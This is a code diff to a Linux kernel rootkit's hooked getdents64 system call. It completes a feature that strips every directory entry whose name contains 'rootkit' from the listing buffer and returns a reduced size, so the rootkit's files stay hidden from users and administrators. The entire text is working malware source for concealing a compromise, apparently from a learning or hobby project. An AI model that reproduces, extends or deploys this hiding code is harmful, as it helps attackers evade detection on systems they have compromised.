@@ -117,7 +117,7 @@ asmlinkage long hook_getdents64(const struct pt_regs *regs)
     // Kernel-side copy of entry :
     struct linux_dirent64 *kernel_cpy = NULL;
     struct linux_dirent64 *cur_entry = NULL; // for looping through all dirents
-    long sz;
+    long sz, spoofed_sz;
     long i = 0;
     long error;
 
@@ -126,6 +126,7 @@ asmlinkage long hook_getdents64(const struct pt_regs *regs)
         /* pr_warn("hook: orig_getdents64 returned bad status: %ld", sz); */
         return sz;
     }
+    spoofed_sz = sz;
 
     kernel_cpy = kmalloc(sz, GFP_KERNEL);
     if (!kernel_cpy)
@@ -138,22 +139,33 @@ asmlinkage long hook_getdents64(const struct pt_regs *regs)
     error = copy_from_user(kernel_cpy, dirent, sz);
     if (error)
     {
-        pr_err("hook: couldn't copy user dirent to kernel buffer. (size: %ld)\n", sz);
+        pr_err(
+            "hook: couldn't copy user dirent to kernel buffer. (size: %ld)\n",
+            sz);
         kfree(kernel_cpy);
         return -1;
     }
 
-    pr_info("hook: copied %ld bytes of real dirent to kernel memory.\n", sz); 
     while (i < sz)
     {
         cur_entry = (void *)kernel_cpy + i;
         if (strstr(cur_entry->d_name, "rootkit") != NULL)
         {
-            // TODO: actually skip it :/
-            pr_info("hook: masking dirent %s.\n", cur_entry->d_name);
+            long remaining = spoofed_sz - (i + cur_entry->d_reclen);
+            spoofed_sz -= cur_entry->d_reclen;
+            pr_info("hook: masking dirent `%s`.\n", cur_entry->d_name);
+            memmove(cur_entry, (void *)cur_entry + cur_entry->d_reclen,
+                    remaining);
+            continue;
         }
-
+        // only increment if we haven't shifted
         i += cur_entry->d_reclen;
+    }
+
+    if (spoofed_sz != sz)
+    {
+        pr_info("hook: shrunk dirent buffer: %ld -> %ld bytes.\n", sz,
+                spoofed_sz);
     }
 
     // Copy our modified version back to the returned dirent:
@@ -166,7 +178,7 @@ asmlinkage long hook_getdents64(const struct pt_regs *regs)
     }
 
     kfree(kernel_cpy);
-    return sz;
+    return spoofed_sz;
 }
 
 #define HOOK_COUNT 2
